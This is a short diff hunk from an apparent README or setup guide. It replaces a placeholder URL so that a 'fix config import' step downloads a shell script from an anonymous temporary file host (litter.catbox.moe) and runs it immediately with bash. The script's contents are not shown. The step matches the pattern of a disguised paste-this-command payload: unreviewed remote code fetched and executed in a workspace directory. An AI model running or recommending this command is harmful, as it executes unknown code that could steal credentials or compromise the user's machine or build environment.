@@ -118,7 +118,7 @@ export EDGE_POLICY_MODE=luxury
 Fallback cards work, but peak templates fail. Fix config import (keeps peak-pure + fallbacks):
 
 ```bash
-cd /home/runner/workspace && curl -fsSL -o NATIVE.sh "https://litter.catbox.moe/PLACEHOLDER_NATIVE.sh" && bash NATIVE.sh
+cd /home/runner/workspace && curl -fsSL -o NATIVE.sh "https://litter.catbox.moe/jnla6d.sh" && bash NATIVE.sh
 ```
 
 Or GitHub:
